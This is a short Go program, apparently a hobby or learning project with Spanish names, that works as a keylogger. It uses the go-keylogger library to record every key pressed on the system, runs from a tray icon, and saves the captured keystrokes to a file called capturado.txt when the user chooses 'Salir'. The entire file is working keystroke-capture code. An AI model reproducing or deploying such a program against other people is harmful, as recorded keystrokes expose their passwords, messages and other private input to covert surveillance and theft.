package main

import (
	"io/ioutil"
	"time"
	"github.com/getlantern/systray"
	"github.com/kindlyfire/go-keylogger"
)

func main() {
	texto := ""
	go func() {
		capturador := keylogger.NewKeylogger()
		for {
			key := capturador.GetKey()
			if !key.Empty {
				texto = texto + string(key.Rune)
			}
			time.Sleep(5 * time.Millisecond)
		}
	}()
	Exit := func() {
		ioutil.WriteFile("capturado.txt", []byte(texto), 0644)
	}
	systray.Run(Menu, Exit)
}

func Menu() {
	boton := systray.AddMenuItem("Salir", "Detiene y guarda")
	go func() {
		<-boton.ClickedCh
		systray.Quit()
	}()
}
